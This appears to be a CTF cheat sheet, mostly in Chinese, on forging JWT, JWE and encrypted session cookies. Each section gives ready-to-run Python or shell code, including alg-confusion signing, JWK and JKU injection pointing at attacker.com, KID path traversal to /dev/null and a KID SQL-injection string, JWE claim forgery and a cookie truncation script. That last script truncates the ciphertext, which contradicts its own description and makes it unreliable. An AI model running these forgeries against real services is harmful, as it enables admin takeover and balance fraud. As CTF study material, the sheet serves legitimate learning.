# CTF Web - JWT & JWE Token Attacks

## Table of Contents
- [Algorithm None](#algorithm-none)
- [Algorithm Confusion (RS256 to HS256)](#algorithm-confusion-rs256-to-hs256)
- [Weak Secret Brute-Force](#weak-secret-brute-force)
- [Unverified Signature (Crypto-Cat)](#unverified-signature-crypto-cat)
- [JWK Header Injection (Crypto-Cat)](#jwk-header-injection-crypto-cat)
- [JKU Header Injection (Crypto-Cat)](#jku-header-injection-crypto-cat)
- [KID Path Traversal (Crypto-Cat)](#kid-path-traversal-crypto-cat)
- [JWT Balance Replay (MetaShop Pattern)](#jwt-balance-replay-metashop-pattern)
- [JWE Token Forgery with Exposed Public Key (UTCTF 2026)](#jwe-token-forgery-with-exposed-public-key-utctf-2026)
- [AES Cookie Length-Field Truncation + CRC32 Swap (DefCamp 2018)](#aes-cookie-length-field-truncation--crc32-swap-defcamp-2018)

通用认证绕过、访问控制与会话攻击参见 [auth-and-access.md](auth-and-access.md)。OAuth/OIDC、SAML、CI/CD 凭据窃取以及基础设施认证攻击参见 [auth-infra.md](auth-infra.md)。

---

## Algorithm None
移除签名，并把 header 中的 `"alg"` 设为 `"none"`。

## Algorithm Confusion (RS256 to HS256)
应用同时接受 RS256 和 HS256，并且两者都使用同一份公钥：
```javascript
const jwt = require('jsonwebtoken');
const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

## Weak Secret Brute-Force
```bash
flask-unsign --decode --cookie "eyJ..."
hashcat -m 16500 jwt.txt wordlist.txt
```

## Unverified Signature (Crypto-Cat)
服务端解码 JWT 时没有校验签名。直接修改 payload 中的 claim，再带着原始（未校验的）签名重新编码即可：
```python
import jwt, base64, json

token = "eyJ..."
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['sub'] = 'administrator'
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f"{parts[0]}.{new_payload}.{parts[2]}"
```
**关键点：** 某些 JWT 库把 `decode()`（不校验）和 `verify()`（校验）分开。若服务端只调用 `decode()`，签名实际上从未被检查。

## JWK Header Injection (Crypto-Cat)
服务端接受嵌入在 JWT header 中的 JWK（JSON Web Key）且不做校验。攻击者可自生成 RSA 密钥，并把对应公钥塞进 header：
```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, base64

private_key = rsa.generate_private_key(65537, 2048, default_backend())
public_numbers = private_key.public_key().public_numbers()

jwk = {
    "kty": "RSA",
    "kid": original_header['kid'],
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode(),
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
}
forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': jwk})
```
**关键点：** 服务端从 token 自身提取公钥，而不是使用预置密钥。于是密钥和签名都由攻击者控制。

## JKU Header Injection (Crypto-Cat)
服务端会根据 JKU（JSON Key URL）header 指定的 URL 拉取公钥，且不校验 URL：
```python
# 1. Host JWKS at attacker-controlled URL
jwks = {"keys": [attacker_jwk]}  # POST to webhook.site or attacker server

# 2. Forge token pointing to attacker JWKS
forged = jwt.encode(
    {"sub": "administrator"},
    attacker_private_key,
    algorithm='RS256',
    headers={'jku': 'https://attacker.com/.well-known/jwks.json'}
)
```
**关键点：** 这是 SSRF 和 token 伪造的组合。服务端会向 token 指定的 URL 发起外连请求，并信任返回的密钥。

## KID Path Traversal (Crypto-Cat)
KID（Key ID）header 被拼进文件路径用于查找验证密钥。可将其指向可预测文件：
```python
# /dev/null returns empty bytes -> HMAC key is empty string
forged = jwt.encode(
    {"sub": "administrator"},
    '',  # Empty string as secret
    algorithm='HS256',
    headers={"kid": "../../../dev/null"}
)
```
**变体：**
- `../../../dev/null` -> 空密钥
- `../../../proc/sys/kernel/hostname` -> 可预测的主机名内容
- KID 中做 SQL 注入：`' UNION SELECT 'known-secret' --`（如果 KID 用于数据库查询）

**关键点：** KID 本应只用于选择密钥；一旦它被直接用于文件路径或 SQL 查询且未过滤，就会变成注入面。

## JWT Balance Replay (MetaShop Pattern)
1. 注册账号，获得余额为 `$100` 的 JWT，并保存该 token
2. 购买商品，余额降到 `$0`
3. 用之前保存的 JWT 替换当前 cookie，余额恢复到 `$100`
4. 退回所有商品，服务端会在 JWT 中的 `$100` 基础上再加退款金额
5. 重复直到余额超过目标价格

**关键点：** 服务端在退款时直接信任 JWT 里的余额，却没有与真实购买记录交叉校验。

## JWE Token Forgery with Exposed Public Key (UTCTF 2026)

**模式（Break the Bank）：** 应用使用 JWE（JSON Web Encryption）而不是 JWT。RSA 公钥对外可见（例如 `/api/key`、`.well-known/jwks.json`，或页面源码）。服务端使用私钥解密 JWE；攻击者只要拿到公钥，就能加密任意伪造 claim，让服务端正常解密并信任。

**与 JWT 的关键区别：** JWE 是 **加密** 而非仅签名。服务端做的是解密。如果它对“能解密”的 token 直接信任，而不额外校验签名或来源，公钥泄露就足以伪造任意内容。

```python
from jwcrypto import jwk, jwe
import json

# 1. Fetch the server's public key
# GET /api/key or extract from JWKS endpoint
public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkq...
-----END PUBLIC KEY-----"""

# 2. Create JWK from public key
key = jwk.JWK.from_pem(public_key_pem.encode())

# 3. Forge claims (e.g., set balance to 999999)
forged_claims = {
    "sub": "attacker",
    "balance": 999999,
    "role": "admin"
}

# 4. Encrypt with server's public key
token = jwe.JWE(
    json.dumps(forged_claims).encode(),
    recipient=key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",  # or RSA-OAEP, RSA1_5
        "enc": "A256GCM"         # or A128CBC-HS256
    })
)
forged_jwe = token.serialize(compact=True)
# 5. Send forged token as cookie/header
```

**识别：** JWE 紧凑格式是 5 段 base64url，以点分隔（`header.enckey.iv.ciphertext.tag`），而普通 JWT 只有 3 段。再结合公开暴露 RSA 公钥的接口一起判断。

**关键点：** JWE 的加密不等于认证。如果服务端只要能解密就信任 token，那么公开公钥就意味着攻击者可以加密任意 claim。优先找公钥暴露点，并尝试加密修改后的 payload。

---

## AES Cookie Length-Field Truncation + CRC32 Swap (DefCamp 2018)

**模式：** 会话 cookie 形如 `AES(key¡value÷...¡)+<len>+<CRC32>`。应用解密后只按 `<len>` 指定的字节数解析，并用 CRC32 做完整性校验。注册时明文可控，因此可以把 `id¡1¡` 提前埋进用户名，再缩短 `<len>` 让解析在该位置截断，并重新计算截断后内容的 CRC32。这样反序列化器看到的就是 `id=1`（admin），而 CRC32 仍会通过，因为 CRC32 不是 MAC。

```python
import struct, zlib, requests, base64

# 1. Register with a username that embeds the target field early.
#    The challenge stores fields as key\xa1value\xf7, AES-encrypts them,
#    then appends a 2-byte length and a 4-byte CRC32.
payload_fields = b"name\xa1attacker\xf7id\xa11\xf7role\xa1user\xf7"
# 2. Grab the encrypted cookie the server set.
sess = requests.Session()
sess.post("http://target/register",
          data={"user": "attacker", "pass": "x", "payload": payload_fields})
cookie = base64.b64decode(sess.cookies["session"])
ct, rest = cookie[:-6], cookie[-6:]          # split off length + CRC32
# 3. Truncate: keep only bytes up to and including "id\xa11\xf7"
truncated_plain = b"name\xa1attacker\xf7id\xa11\xf7"
new_len = struct.pack("<H", len(truncated_plain))
new_crc = struct.pack("<I", zlib.crc32(ct[: len(truncated_plain)]))
forged = base64.b64encode(ct[: len(truncated_plain)] + new_len + new_crc)
sess.cookies["session"] = forged.decode()
print(sess.get("http://target/admin").text)
```

**关键点：** CRC32 只是校验和，不是消息认证码；它是线性的，所以你可以修改密文后重新计算 CRC，让 cookie 依旧“合法”。再加上一个指示解析长度的字段，攻击者就能在任意位置截断（甚至扩展）明文。审计这类 cookie 时，如果完整性算法是 `crc32`、`adler32`、`md5`，或任何非 HMAC/AEAD 方案，都应默认其可伪造。

**References:** DefCamp CTF Qualification 2018 — Get Admin, writeup 11430
